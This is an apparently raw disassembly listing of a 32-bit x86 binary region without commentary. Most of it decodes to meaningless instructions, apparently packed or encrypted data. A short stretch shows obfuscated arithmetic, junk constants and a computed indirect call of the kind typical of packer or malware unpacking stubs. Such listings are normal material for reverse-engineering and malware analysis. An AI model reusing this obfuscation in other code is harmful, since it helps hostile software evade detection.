  40cdb0:	push   eax
  40cdb1:	lds    ecx,FWORD PTR [ebx-0x54]
  40cdb4:	pop    es
  40cdb5:	ret    
  40cdb6:	neg    ah
  40cdb8:	repnz stos DWORD PTR es:[edi],eax
  40cdba:	int    0x12
  40cdbc:	xor    eax,0x1669e750
  40cdc1:	sub    BYTE PTR [ecx+eiz*2],dh
  40cdc4:	(bad)  
  40cdc5:	jbe    0x40cdea
  40cdc7:	addr16 sbb eax,eax
  40cdca:	fcomp  QWORD PTR [edi+0x76cad584]
  40cdd0:	xor    eax,ecx
  40cdd2:	sbb    BYTE PTR [esi+ecx*4-0x5b],dl
  40cdd6:	cdq    
  40cdd7:	xchg   edx,eax
  40cdd8:	jle    0x40cd85
  40cdda:	xchg   ebx,ecx
  40cddc:	jg     0x40ce0c
  40cdde:	es inc eax
  40cde0:	stos   BYTE PTR es:[edi],al
  40cde1:	mov    BYTE PTR [esi+0x14],al
  40cde4:	int    0x4e
  40cde6:	fiadd  WORD PTR [eax]
  40cde8:	and    al,0x1e
  40cdea:	or     DWORD PTR [ebp+0x3a],0xffffffa9
  40cdee:	sbb    eax,0xbff240b2
  40cdf3:	push   ecx
  40cdf4:	sub    eax,0x4fef5cf1
  40cdf9:	or     BYTE PTR [edi+0x14b77744],cl
  40cdff:	sub    al,0x61
  40ce01:	gs jns 0x40cda3
  40ce04:	sub    DWORD PTR [edi-0x25926e0e],eax
  40ce0a:	(bad)
  40ce0d:	sub    BYTE PTR [edi],dh
  40ce0f:	les    ebx,FWORD PTR [edx-0x73]
  40ce12:	push   edx
  40ce13:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce14:	dec    ebx
  40ce15:	inc    edx
  40ce16:	inc    ecx
  40ce17:	and    bl,BYTE PTR [eax]
  40ce19:	imul   ebp,DWORD PTR [ecx-0x48],0xffffff98
  40ce1d:	test   al,0x46
  40ce1f:	mov    edx,0xc8dac8ef
  40ce24:	pop    ebx
  40ce25:	sub    dh,bl
  40ce27:	xor    eax,0xdf24a289
  40ce2c:	lock xacquire sbb BYTE PTR [ecx+eiz*1],bh
  40ce31:	test   BYTE PTR [esi],dl
  40ce33:	push   edi
  40ce34:	cmp    DWORD PTR [ebx-0xb],esp
  40ce37:	hlt    
  40ce38:	in     al,dx
  40ce39:	jle    0x40ceb9
  40ce3b:	sbb    ecx,DWORD PTR [eax+esi*2-0x1cffd4da]
  40ce42:	fstp   DWORD PTR [ebp-0x5e5ad539]
  40ce48:	(bad)  
  40ce49:	jne    0x40cdeb
  40ce4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce4c:	std    
  40ce4d:	add    ch,BYTE PTR [ebp-0x10]
  40ce50:	jge    0x40ce2e
  40ce52:	loop   0x40ce35
  40ce54:	sub    eax,0xc5cae1ec
  40ce59:	repnz cmp esp,DWORD PTR [bp+si+0x77]
  40ce5e:	adc    al,0x1d
  40ce60:	ret    0xcb71
  40ce63:	std    
  40ce64:	jns    0x40ced5
  40ce66:	sets   BYTE PTR [ebx]
  40ce69:	jns    0x40ce47
  40ce6b:	mov    al,0x68
  40ce6d:	mov    ecx,0x4f9c909e
  40ce72:	mov    ds:0x808fccbf,eax
  40ce77:	or     bh,BYTE PTR ds:0x6be9a2b0
  40ce7d:	hlt    
  40ce7e:	in     eax,dx
  40ce7f:	cmc    
  40ce80:	xor    dl,BYTE PTR [eax-0x57]
  40ce83:	xor    ecx,DWORD PTR [eax]
  40ce85:	jae    0x40cecf
  40ce87:	icebp  
  40ce88:	repz push eax
  40ce8a:	pop    ds
  40ce8b:	popf   
  40ce8c:	(bad)  
  40ce8d:	pop    ss
  40ce8e:	add    edx,DWORD PTR [ebx]
  40ce90:	sub    esp,0x56
  40ce93:	popa   
  40ce94:	fdivr  DWORD PTR [esp+ebp*4-0x5c]
  40ce98:	les    edi,FWORD PTR [edi+0x2e9f17af]
  40ce9e:	out    dx,al
  40ce9f:	repz xor eax,0x661a330c
  40cea5:	push   ds
  40cea6:	mov    eax,ds:0xe40bf3df
  40ceab:	ins    BYTE PTR es:[edi],dx
  40ceac:	test   eax,0x6b76504d
  40ceb1:	dec    eax
  40ceb2:	cmp    al,0xdb
  40ceb4:	std    
  40ceb5:	mov    dl,0x72
  40ceb7:	or     eax,0x9d4cd374
  40cebc:	(bad)  
  40cebd:	mov    BYTE PTR gs:[edx],cl
  40cec0:	add    eax,0x26b31127
  40cec5:	jg     0x40cefc
  40cec7:	ret    
  40cec8:	cdq    
  40cec9:	adc    DWORD PTR [esi+0x27],ecx
  40cecc:	pop    edi
  40cecd:	cwde   
  40cece:	(bad)  [edi-0x5623cdec]
  40ced4:	loop   0x40ceb6
  40ced6:	in     al,dx
  40ced7:	push   ebx
  40ced8:	ret    0x27f9
  40cedb:	lds    eax,FWORD PTR [ebx]
  40cedd:	fnstsw WORD PTR [esp+ebx*1+0x10a0bdc9]
  40cee4:	push   ds
  40cee5:	pop    eax
  40cee6:	add    DWORD PTR [eax],ebx
  40cee8:	mov    bh,BYTE PTR [esi+0x7a]
  40ceeb:	xchg   edx,eax
  40ceec:	mov    ds:0x2445ce96,al
  40cef1:	outs   dx,BYTE PTR ds:[esi]
  40cef2:	jmp    0x7c36544f
  40cef7:	in     al,0x59
  40cef9:	mov    ds:0xcdfb359c,eax
  40cefe:	mov    es,eax
  40cf00:	call   0x1820:0xbcde35f9
  40cf07:	int3   
  40cf08:	outs   dx,BYTE PTR ds:[esi]
  40cf09:	mov    cl,0x79
  40cf0b:	out    dx,al
  40cf0c:	inc    eax
  40cf0d:	mov    dl,0x47
  40cf0f:	or     BYTE PTR [eax-0x74],dl
  40cf12:	push   edx
  40cf13:	fsubr  QWORD PTR [eax]
  40cf15:	adc    DWORD PTR [edi-0x1920d275],0xffffff9e
  40cf1c:	sbb    eax,0x7ed77cf9
  40cf21:	adc    al,0xb3
  40cf23:	mov    eax,ds:0x2c301707
  40cf28:	mov    dl,0x32
  40cf2a:	cmc    
  40cf2b:	jle    0x40cf65
  40cf2d:	stos   DWORD PTR es:[edi],eax
  40cf2e:	adc    DWORD PTR [edx-0x6],0xfffffff3
  40cf32:	ins    BYTE PTR es:[edi],dx
  40cf33:	cmp    al,0x36
  40cf35:	dec    ecx
  40cf36:	mov    edi,0x6607d97e
  40cf3b:	test   eax,0x291c92c2
  40cf40:	and    al,0x3d
  40cf42:	sub    eax,0xece852c4
  40cf47:	xor    ebx,ecx
  40cf49:	and    DWORD PTR [ecx+0x35],edi
  40cf4c:	mov    dh,0x80
  40cf4e:	(bad)  
  40cf4f:	sub    ebx,DWORD PTR [esi+0x11]
  40cf52:	xor    DWORD PTR [eax+0x6e308864],0x3
  40cf59:	loop   0x40cf18
  40cf5b:	mov    eax,ds:0x5f4d482
  40cf60:	and    BYTE PTR [ebp+0x4a439b90],ch
  40cf66:	aam    0x60
  40cf68:	ret    0xeca2
  40cf6b:	cmp    DWORD PTR [ebx],ebp
  40cf6d:	pop    esi
  40cf6e:	pop    esi
  40cf6f:	in     eax,dx
  40cf70:	shr    BYTE PTR [ecx-0x3efce50f],0xc6
  40cf77:	loopne 0x40cf56
  40cf79:	jle    0x40cf8c
  40cf7b:	cdq    
  40cf7c:	dec    ebp
  40cf7d:	or     al,ah
  40cf7f:	or     eax,0xf5c9d08d
  40cf84:	push   eax
  40cf85:	mov    dl,0x99
  40cf87:	jp     0x40cf18
  40cf89:	pushf  
  40cf8a:	lods   eax,DWORD PTR ds:[esi]
  40cf8b:	xchg   esi,esi
  40cf8d:	cs ret 
  40cf8f:	pop    ecx
  40cf90:	or     bh,BYTE PTR [esi]
  40cf92:	jns    0x40cf30
  40cf94:	retf   
  40cf95:	mov    esi,0x7394822b
  40cf9a:	js     0x40cf49
  40cf9c:	inc    esp
  40cf9d:	mov    eax,0x883c6a3a
  40cfa2:	(bad)  
  40cfa3:	inc    edi
  40cfa4:	mov    dh,0xbe
  40cfa6:	push   ss
  40cfa7:	test   eax,0x423c2006
  40cfac:	retf   0x8e00
  40cfaf:	(bad)  
  40cfb0:	(bad)  
  40cfb1:	xlat   BYTE PTR ds:[ebx]
  40cfb2:	fucomi st,st(6)
  40cfb4:	mov    edi,0xe9989691
  40cfb9:	and    BYTE PTR [ebx-0xc7b416c],cl
  40cfbf:	outs   dx,DWORD PTR ds:[esi]
  40cfc0:	inc    esp
  40cfc1:	xchg   DWORD PTR [esi-0x7c3dc65d],ebx
  40cfc7:	jns    0x40d00a
  40cfc9:	in     eax,dx
  40cfca:	icebp  
  40cfcb:	cli    
  40cfcc:	aad    0xad
  40cfce:	das    
  40cfcf:	stos   DWORD PTR es:[edi],eax
  40cfd0:	mov    ds:0xc47fc488,eax
  40cfd5:	nop
  40cfd6:	mov    al,ds:0xa3f67809
  40cfdb:	xchg   edx,eax
  40cfdc:	sub    DWORD PTR [eax-0x7277707f],ebx
  40cfe2:	jp     0x40cfb0
  40cfe4:	jmp    0x40d03c
  40cfe6:	inc    eax
  40cfe7:	aam    0x74
  40cfe9:	dec    ebx
  40cfea:	ret    0xae3f
  40cfed:	scas   eax,DWORD PTR es:[edi]
  40cfee:	xchg   BYTE PTR [edi+eax*8+0x1a],dh
  40cff2:	cmp    BYTE PTR [ebp+0x693e2da2],dl
  40cff8:	loop   0x40d070
  40cffa:	icebp  
  40cffb:	aaa    
  40cffc:	sub    eax,0x93cb24d5
  40d001:	cmp    bh,BYTE PTR [eax*1+0x717ce1fb]
  40d008:	xchg   ecx,eax
  40d009:	adc    eax,0x20a53124
  40d00e:	jae    0x40cff3
  40d010:	in     eax,dx
  40d011:	ins    DWORD PTR es:[edi],dx
  40d012:	and    eax,0xcdeabeee
  40d017:	mov    edi,0xf7100e17
  40d01c:	jge    0x40d03a
  40d01e:	fnsave [eax-0x12]
  40d021:	sahf   
  40d022:	popa   
  40d023:	call   0xf8a6:0xb9af9b0d
  40d02a:	jo     0x40cfb0
  40d02c:	call   0x9634:0xba688189
  40d033:	sub    bh,0xbe
  40d036:	xchg   ecx,eax
  40d037:	lods   eax,DWORD PTR ds:[esi]
  40d038:	fistp  DWORD PTR [edi]
  40d03a:	or     dl,BYTE PTR [esi+ebp*2]
  40d03d:	mov    dl,0xa7
  40d03f:	bound  eax,QWORD PTR ds:0x37bdabc4
  40d045:	sub    BYTE PTR [edx-0x55],ch
  40d048:	test   eax,0x9ab0d7b1
  40d04d:	out    dx,ax
  40d04f:	arpl   WORD PTR [edi+edx*2-0x5c],dx
  40d053:	fild   QWORD PTR [ecx+0x73f3ba5b]
  40d059:	or     BYTE PTR [esi-0x4575f7bd],al
  40d05f:	jmp    0x314a:0x415d8830
  40d066:	adc    BYTE PTR [edx-0x10e89be8],dh
  40d06c:	fcomi  st,st(7)
  40d06e:	sahf   
  40d06f:	add    DWORD PTR [ecx+eax*4+0xd],0xffffffd6
  40d074:	inc    edi
  40d075:	fld    DWORD PTR [ebx+0x4d450b20]
  40d07b:	ror    DWORD PTR [edi],0xbc
  40d07e:	cdq    
  40d07f:	in     eax,dx
  40d080:	out    0x6d,al
  40d082:	sub    eax,0x44d63453
  40d087:	imul   esp,edx,0xc041266b
  40d08d:	out    0x67,eax
  40d08f:	loopne 0x40d0f4
  40d091:	push   ss
  40d092:	inc    ebx
  40d093:	and    al,0xb7
  40d095:	ret    0xac2e
  40d098:	ins    BYTE PTR es:[edi],dx
  40d099:	(bad)  
  40d09a:	and    edx,DWORD PTR [eax]
  40d09c:	inc    ecx
  40d09d:	daa    
  40d09e:	ins    BYTE PTR es:[edi],dx
  40d09f:	int3   
  40d0a0:	std    
  40d0a1:	sbb    DWORD PTR [esi+0x75],esp
  40d0a4:	lods   eax,DWORD PTR ds:[esi]
  40d0a5:	sbb    BYTE PTR [ebp-0x57ce9acd],al
  40d0ab:	mov    BYTE PTR [esi],dl
  40d0ad:	stc    
  40d0ae:	je     0x40d0aa
  40d0b0:	pop    esi
  40d0b1:	mov    DWORD PTR [eax+0x68f7a5d],ebp
  40d0b7:	fild   QWORD PTR [edi+0x4059d16c]
  40d0bd:	pop    eax
  40d0be:	push   es
  40d0bf:	imul   esp,DWORD PTR [eax+edx*2-0x4162c0ba],0x1
  40d0c7:	shr    DWORD PTR [esi-0x3a75ae4a],1
  40d0cd:	in     al,0xdc
  40d0cf:	(bad)  
  40d0d0:	aam    0x4d
  40d0d2:	out    0x3c,al
  40d0d4:	inc    ebp
  40d0d5:	dec    eax
  40d0d6:	inc    BYTE PTR [ebp+0x17]
  40d0d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d0da:	pop    ebp
  40d0db:	fsub   DWORD PTR [edx+0x701ec6d4]
  40d0e1:	cmc    
  40d0e2:	inc    esi
  40d0e3:	sar    ah,cl
  40d0e5:	sub    BYTE PTR [ebx+ebp*8],bl
  40d0e8:	add    al,0xd2
  40d0ea:	inc    eax
  40d0eb:	pop    ss
  40d0ec:	rdmsr  
  40d0ee:	mov    ecx,0x18b291dc
  40d0f3:	aas    
  40d0f4:	sub    eax,0x3ad1b10a
  40d0f9:	mov    ecx,0x1c4e3b01
  40d0fe:	dec    esp
  40d0ff:	mov    al,ds:0x9a0d617f
  40d104:	repnz popa 
  40d106:	mov    cl,0x4c
  40d108:	sahf   
  40d109:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d10a:	push   eax
  40d10b:	xor    BYTE PTR [ebx-0x71],0xa9
  40d10f:	rcr    DWORD PTR [ecx+0x48224115],1
  40d115:	(bad)  
  40d116:	pop    ecx
  40d117:	inc    edi
  40d118:	pop    ss
  40d119:	sbb    DWORD PTR [eax+0xd],eax
  40d11c:	push   esp
  40d11d:	adc    ecx,DWORD PTR [edi]
  40d11f:	xor    eax,0x5f484626
  40d124:	fwait
  40d125:	push   edx
  40d126:	adc    esi,ebx
  40d128:	retf   
  40d129:	js     0x40d14f
  40d12b:	ins    DWORD PTR es:[edi],dx
  40d12c:	cmc    
  40d12d:	mov    dh,0x60
  40d12f:	test   al,0xec
  40d131:	push   0xf36b471c
  40d136:	push   edx
  40d137:	cld    
  40d138:	es sub ch,0xae
  40d13c:	fdiv   st(6),st
  40d13e:	adc    DWORD PTR [ebx-0x2f],esp
  40d141:	(bad)  
  40d142:	rol    DWORD PTR [esi+0x5b],1
  40d145:	jne    0x40d1be
  40d147:	and    al,0x49
  40d149:	mov    ch,0xb8
  40d14b:	push   edx
  40d14c:	push   ds
  40d14d:	dec    eax
  40d14e:	jo     0x40d188
  40d150:	push   ebx
  40d151:	and    DWORD PTR [esi],ebp
  40d153:	mov    al,0x61
  40d155:	xchg   DWORD PTR [edi+0x28a663cc],ebp
  40d15b:	sbb    ebp,ebx
  40d15d:	ror    DWORD PTR [ecx-0x2d3078af],cl
  40d163:	lds    edi,FWORD PTR [eax-0x7b]
  40d166:	inc    edx
  40d167:	aam    0x84
  40d169:	jg     0x40d152
  40d16b:	(bad)  
  40d16c:	jnp    0x40d14b
  40d16e:	sub    eax,0xf1198bf0
  40d173:	cmp    eax,0xaaeff4de
  40d178:	xor    eax,0x7ba5621
  40d17d:	aam    0x51
  40d17f:	shr    bh,0x35
  40d182:	sbb    cl,BYTE PTR [ecx-0x2f2aad5c]
  40d188:	es out 0x3,eax
  40d18b:	scas   al,BYTE PTR es:[edi]
  40d18c:	sub    al,0xf8
  40d18e:	and    DWORD PTR [ecx+0x3b9c16b0],esi
  40d194:	xchg   BYTE PTR [ebx+0x51cb8590],bh
  40d19a:	out    0xa3,eax
  40d19c:	stos   DWORD PTR es:[edi],eax
  40d19d:	fbstp  TBYTE PTR [edi]
  40d19f:	mov    ds:0x1928b443,al
  40d1a4:	and    al,0x3
  40d1a6:	out    dx,eax
  40d1a7:	xlat   BYTE PTR ds:[ebx]
  40d1a8:	ss jmp 0xee0857cc
  40d1ae:	ja     0x40d165
  40d1b0:	ficomp DWORD PTR [ecx-0x12ebeea5]
  40d1b6:	ret    
  40d1b7:	ins    BYTE PTR es:[edi],dx
  40d1b8:	or     esp,esi
  40d1ba:	mov    eax,ds:0xf1f02fe1
  40d1bf:	adc    BYTE PTR [ebx],0x8b
  40d1c2:	pop    esi
  40d1c3:	fcom   DWORD PTR [edi+0x683ec991]
  40d1c9:	xor    eax,0x8c92ccba
  40d1ce:	les    edi,FWORD PTR [edi+0x6f740334]
  40d1d4:	sbb    dh,dl
  40d1d6:	into   
  40d1d7:	mov    ?,WORD PTR [edi+edi*4]
  40d1da:	inc    ebp
  40d1db:	push   ss
  40d1dc:	sub    al,0x50
  40d1de:	mul    DWORD PTR [esi-0x19]
  40d1e1:	shl    BYTE PTR [edx-0x15],cl
  40d1e4:	popf   
  40d1e5:	je     0x40d23c
  40d1e7:	and    bh,al
  40d1e9:	sub    DWORD PTR [edi],0x52
  40d1ec:	xchg   ebx,eax
  40d1ed:	jecxz  0x40d227
  40d1ef:	inc    edi
  40d1f0:	ds int3 
  40d1f2:	div    BYTE PTR [ecx+0x1b]
  40d1f5:	add    DWORD PTR [esi+edi*8-0xd],ecx
  40d1f9:	sub    al,0xef
  40d1fb:	jmp    0x8797:0x3cb0ffb4
  40d202:	inc    bx
  40d204:	mov    esp,0x41d6e864
  40d209:	data16 ins BYTE PTR es:[edi],dx
  40d20b:	push   esp
  40d20c:	aam    0x31
  40d20e:	lods   eax,DWORD PTR ds:[esi]
  40d20f:	cmp    al,0x76
  40d211:	daa    
  40d212:	jl     0x40d236
  40d214:	arpl   WORD PTR [esi],bx
  40d216:	jmp    0x40d1cd
  40d218:	dec    edx
  40d219:	xor    ch,BYTE PTR [esi-0x37]
  40d21c:	int3   
  40d21d:	xchg   ecx,eax
  40d21e:	(bad)  
  40d21f:	(bad)  
  40d220:	mov    edx,0xd8e37d80
  40d225:	les    esp,FWORD PTR [ebp+esi*1+0x42]
  40d229:	jle    0x40d295
  40d22b:	mov    edi,0xe109f7f1
  40d230:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d231:	dec    ebp
  40d232:	inc    edi
  40d233:	jmp    0x40d22d
  40d235:	push   eax
  40d236:	xor    BYTE PTR [edi],ch
  40d238:	es push esi
  40d23a:	xchg   esp,eax
  40d23b:	dec    edi
  40d23c:	mov    ds:0xf3b517c7,al
  40d241:	fisttp DWORD PTR [edi+ebp*8-0x23]
  40d245:	in     eax,dx
  40d246:	call   0x4df7:0x10e4f01c
  40d24d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d24e:	push   esi
  40d24f:	mov    DWORD PTR [eax],edi
  40d251:	sbb    eax,0x89f3b763
  40d256:	dec    eax
  40d257:	xchg   BYTE PTR [ebx],ch
  40d259:	in     al,dx
  40d25a:	(bad)  
  40d25b:	mov    edi,0x9618d9cc
  40d260:	dec    eax
  40d261:	bound  eax,QWORD PTR [eax]
  40d263:	out    0x4a,al
  40d265:	mov    ebx,DWORD PTR [ecx+0x1e]
  40d268:	aad    0x8b
  40d26a:	mov    ?,WORD PTR [edx+0x5d962ddc]
  40d270:	push   edi
  40d271:	pop    esi
  40d272:	pop    ss
  40d273:	inc    eax
  40d274:	xchg   ecx,eax
  40d275:	cmp    ah,BYTE PTR [esi+0x36]
  40d278:	jecxz  0x40d2b8
  40d27a:	push   0x8dec11f6
  40d27f:	sbb    al,0x30
  40d281:	or     DWORD PTR [eax],0xfffffff1
  40d284:	or     al,0x2a
  40d286:	xlat   BYTE PTR ds:[bx]
  40d288:	or     esp,DWORD PTR [ecx+ecx*1-0x24]
  40d28c:	push   ebp
  40d28d:	mov    edx,0x4173cce0
  40d292:	xchg   esp,eax
  40d293:	mov    al,ds:0x85667579
  40d298:	mov    eax,DWORD PTR [ebp-0x1c]
  40d29b:	test   eax,eax
  40d29d:	je     0x40d339
  40d2a3:	mov    DWORD PTR [ebp-0x20],0x0
  40d2aa:	push   edx
  40d2ab:	pop    eax
  40d2ac:	push   0x5
  40d2ae:	sub    edx,eax
  40d2b0:	pop    edx
  40d2b1:	add    edx,0xa
  40d2b4:	push   edx
  40d2b5:	pop    ecx
  40d2b6:	push   0xa
  40d2b8:	dec    ecx
  40d2b9:	pop    ebx
  40d2ba:	dec    ebx
  40d2bb:	xchg   ebx,ecx
  40d2bd:	sub    ebx,ecx
  40d2bf:	xchg   ebx,ecx
  40d2c1:	dec    ecx
  40d2c2:	mov    eax,DWORD PTR [ebp-0x1c]
  40d2c5:	imul   eax,ecx
  40d2c8:	sub    esp,eax
  40d2ca:	mov    DWORD PTR [ebp-0x20],esp
  40d2cd:	mov    eax,DWORD PTR [ebp-0x4]
  40d2d0:	xor    eax,esi
  40d2d2:	add    eax,edi
  40d2d4:	jmp    0x40d312
  40d2d9:	mov    ecx,DWORD PTR [ebp-0xc]
  40d2dc:	mov    eax,DWORD PTR [ebp+0x8]
  40d2df:	mov    edx,DWORD PTR [ebp+0x14]
  40d2e2:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40d2e6:	xor    ecx,esi
  40d2e8:	add    ecx,edi
  40d2ea:	xor    edx,edx
  40d2ec:	div    ecx
  40d2ee:	mov    ecx,DWORD PTR [ebp-0x4]
  40d2f1:	xor    ecx,esi
  40d2f3:	lea    eax,[ecx+eax*1+0x3272fa]
  40d2fa:	mov    ecx,DWORD PTR [ebp+0x8]
  40d2fd:	mov    edx,DWORD PTR [ebp-0x20]
  40d300:	mov    DWORD PTR [edx+ecx*4],eax
  40d303:	mov    eax,DWORD PTR [ebp-0xc]
  40d306:	mov    ecx,DWORD PTR [ebp+0x8]
  40d309:	xor    eax,esi
  40d30b:	lea    eax,[eax+ecx*1+0x3272fa]
  40d312:	mov    DWORD PTR [ebp+0x8],eax
  40d315:	mov    eax,DWORD PTR [ebp-0xc]
  40d318:	mov    ecx,DWORD PTR [ebp+0x14]
  40d31b:	xor    eax,esi
  40d31d:	add    eax,edi
  40d31f:	imul   eax,DWORD PTR [ecx]
  40d322:	mov    ecx,DWORD PTR [ebp-0x4]
  40d325:	mov    edx,DWORD PTR [ebp+0x8]
  40d328:	xor    ecx,esi
  40d32a:	lea    ecx,[ecx+edx*1+0x3272fa]
  40d331:	cmp    ecx,eax
  40d333:	jne    0x40d2d9
  40d339:	mov    eax,DWORD PTR [ebp-0x4]
  40d33c:	xor    eax,esi
  40d33e:	add    eax,edi
  40d340:	mov    DWORD PTR [ebp-0x10],eax
  40d343:	and    ebx,0x6547647
  40d349:	xor    ebx,0x8768765
  40d34f:	xchg   ebx,esi
  40d351:	xor    ebx,ebx
  40d353:	push   esi
  40d354:	mov    esi,ebx
  40d356:	pop    ebx
  40d357:	mov    edx,esi
  40d359:	add    ebx,0x1002
  40d35f:	lea    eax,[ebp-0x18]
  40d362:	add    edx,eax
  40d364:	add    edx,0x5
  40d367:	push   edx
  40d368:	inc    esi
  40d369:	pop    ecx
  40d36a:	dec    ecx
  40d36b:	xchg   ecx,eax
  40d36c:	dec    eax
  40d36d:	xchg   ecx,eax
  40d36e:	dec    ecx
  40d36f:	xchg   ecx,edx
  40d371:	dec    edx
  40d372:	push   edx
  40d373:	mov    edx,ebx
  40d375:	pop    ebx
  40d376:	dec    ebx
  40d377:	call   DWORD PTR [ebx]
  40d379:	cmp    DWORD PTR [ebp+0x10],esi
  40d37c:	je     0x40d39d
  40d382:	xchg   edx,eax
  40d383:	push   0xc
  40d385:	pop    ecx
  40d386:	dec    ecx
  40d387:	push   0x3
  40d389:	pop    ebx
  40d38a:	inc    ebx
  40d38b:	xchg   ebx,ecx
  40d38d:	inc    ecx
  40d38e:	sub    ebx,ecx
  40d390:	xchg   ebx,ecx
  40d392:	dec    ecx
  40d393:	dec    ecx
  40d394:	mov    eax,DWORD PTR [ebp-0x1c]
  40d397:	imul   eax,ecx
  40d39a:	add    esp,eax
  40d39c:	xchg   edx,eax
  40d39d:	push   eax
  40d39e:	xor    ebx,ebx
  40d3a0:	mov    edx,esp
  40d3a2:	dec    edx
  40d3a3:	inc    ebx
  40d3a4:	add    ebx,DWORD PTR [edx+ebx*1]
  40d3a7:	dec    ebx
  40d3a8:	xor    edx,edx
  40d3aa:	add    DWORD PTR [ebp-0x10],ebx
  40d3ad:	pop    ebx
  40d3ae:	mov    eax,DWORD PTR [ebp-0x10]
  40d3b1:	pop    edi
  40d3b2:	pop    esi
  40d3b3:	pop    ebx
  40d3b4:	leave  
  40d3b5:	ret    0x10
  40d3b8:	push   ebp
  40d3b9:	mov    ebp,esp
  40d3bb:	push   ecx
  40d3bc:	or     DWORD PTR ds:0x426f29,0x4a1b
  40d3c6:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40d3cd:	movzx  edx,BYTE PTR ds:0x426f19
  40d3d4:	sub    DWORD PTR ds:0x426f21,edx
  40d3da:	mov    eax,DWORD PTR [ebp-0x4]
  40d3dd:	mov    DWORD PTR ds:0x426e91,0x1a
  40d3e7:	cmp    DWORD PTR ds:0x426e91,0x0
  40d3ee:	je     0x40d421
  40d3f4:	cmp    DWORD PTR ds:0x426e91,0x24
  40d3fb:	jl     0x40d421
  40d401:	jmp    0x40d40f
  40d406:	push   DWORD PTR [ebp-0xc]
  40d409:	call   DWORD PTR ds:0x42fa2c
  40d40f:	mov    edx,DWORD PTR ds:0x426e91
  40d415:	dec    edx
  40d416:	mov    DWORD PTR ds:0x426e91,edx
  40d41c:	jmp    0x40d3e7
  40d421:	mov    edx,DWORD PTR [ebp+0x10]
  40d424:	xor    ecx,0x6edc
  40d42a:	jmp    0x40f7c6
  40d42f:	mov    ah,0x4a
  40d431:	hlt    
  40d432:	mov    ebx,0x74b46574
  40d437:	ja     0x40d48b
  40d439:	out    dx,al
  40d43a:	je     0x40d438
  40d43c:	xor    cl,BYTE PTR [eax-0x1f]
  40d43f:	sbb    ch,BYTE PTR [edx]
  40d441:	jnp    0x40d4be
  40d443:	clc    
  40d444:	pushf  
  40d445:	jnp    0x40d4c2
  40d447:	fadd   DWORD PTR es:[edx+0x5876d800]
  40d44e:	pushf  
  40d44f:	stc    
  40d450:	or     bl,ch
  40d452:	sbb    eax,0xcfc669a
  40d457:	int    0x67
  40d459:	out    dx,al
  40d45a:	js     0x40d402
  40d45c:	test   BYTE PTR [edi+0x62530a9a],0x21
  40d463:	adc    eax,0x1e9da110
  40d468:	fbld   TBYTE PTR [edi-0x43164e47]
  40d46e:	sbb    al,0x1d
  40d470:	int    0xf0
  40d472:	add    esp,DWORD PTR [eax-0x70a1d37a]
  40d478:	sub    dl,BYTE PTR [eax-0x5a]
  40d47b:	div    DWORD PTR [bx+di]
  40d47e:	or     BYTE PTR [ecx+ebp*1-0x4b],dl
  40d482:	ins    DWORD PTR es:[edi],dx
  40d483:	test   BYTE PTR [esi-0x7fad54de],0x8a
  40d48a:	and    dl,BYTE PTR [edx-0x53]
  40d48d:	sar    dl,1
  40d48f:	add    al,0xf0
  40d491:	(bad)  
  40d492:	or     eax,0xb35ebfcd
  40d497:	ins    DWORD PTR es:[edi],dx
  40d498:	inc    ebp
  40d499:	ficomp DWORD PTR [esi+0x3b72071b]
  40d49f:	push   eax
  40d4a0:	test   DWORD PTR [ecx],edx
  40d4a2:	(bad)  
  40d4a3:	ja     0x40d4da
  40d4a5:	leave  
  40d4a6:	retf   0xbc76
  40d4a9:	sbb    eax,0x30efea30
  40d4ae:	lds    edx,FWORD PTR [ecx+0x5]
  40d4b1:	das    
  40d4b2:	aaa    
  40d4b3:	pushf  
  40d4b4:	neg    edi
  40d4b6:	mov    bh,0x14
  40d4b8:	push   ebx
  40d4b9:	pop    eax
  40d4ba:	push   esp
  40d4bb:	add    DWORD PTR [edx+edi*1-0x7d],esi
  40d4bf:	scas   al,BYTE PTR es:[edi]
  40d4c0:	push   0xfffffffa
  40d4c2:	jg     0x40d512
  40d4c4:	xor    BYTE PTR [edi+eax*4],bh
  40d4c7:	adc    dl,BYTE PTR [eax-0x12]
  40d4ca:	gs in  al,0xba
  40d4cd:	lods   eax,DWORD PTR ds:[esi]
  40d4ce:	shl    BYTE PTR [eax],1
  40d4d0:	sbb    eax,0x723cca2a
  40d4d5:	pushf  
  40d4d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d4d7:	pop    ds
  40d4d8:	js     0x40d4f0
  40d4da:	shl    ah,0x79
  40d4dd:	sub    al,BYTE PTR [esi+ecx*4-0x42]
  40d4e1:	out    dx,eax
  40d4e2:	in     al,dx
  40d4e3:	inc    edx
  40d4e4:	in     al,dx
  40d4e5:	fmul   DWORD PTR [ecx+0x1771e52a]
  40d4eb:	or     esp,DWORD PTR [ebp+0x4d09db7b]
  40d4f1:	lahf   
  40d4f2:	mov    bh,0x79
  40d4f5:	fsub   st(3),st
  40d4f7:	or     ebp,edi
  40d4f9:	int3   
  40d4fa:	ins    DWORD PTR es:[edi],dx
  40d4fb:	loop   0x40d52b
  40d4fd:	lods   eax,DWORD PTR ds:[esi]
  40d4fe:	cmp    ch,BYTE PTR [ecx]
  40d500:	cmc    
  40d501:	or     al,bh
  40d503:	lock cmp DWORD PTR es:[edx-0x22],eax
  40d508:	jg     0x40d578
  40d50a:	repnz addr16 sub eax,0xc75180c5
  40d511:	je     0x40d529
  40d513:	sbb    al,dl
  40d515:	in     al,0x9f
  40d517:	je     0x40d4f0
  40d519:	inc    ebx
  40d51a:	aas    
  40d51b:	rcr    DWORD PTR [edi+0x12],0x4e
  40d51f:	imul   edx,edx,0xffffffca
  40d522:	popa   
  40d523:	imul   ecx,DWORD PTR ds:0xd6a66070,0xffffff91
  40d52a:	push   edi
  40d52b:	mov    eax,ds:0x7d11fb2a
  40d530:	and    al,0xd4
  40d532:	shl    DWORD PTR [esi+0x5d],1
  40d535:	or     al,0x78
  40d537:	jne    0x40d56e
  40d539:	mov    dl,0x3c
  40d53b:	imul   esp,DWORD PTR [edx],0x6f
  40d53e:	dec    eax
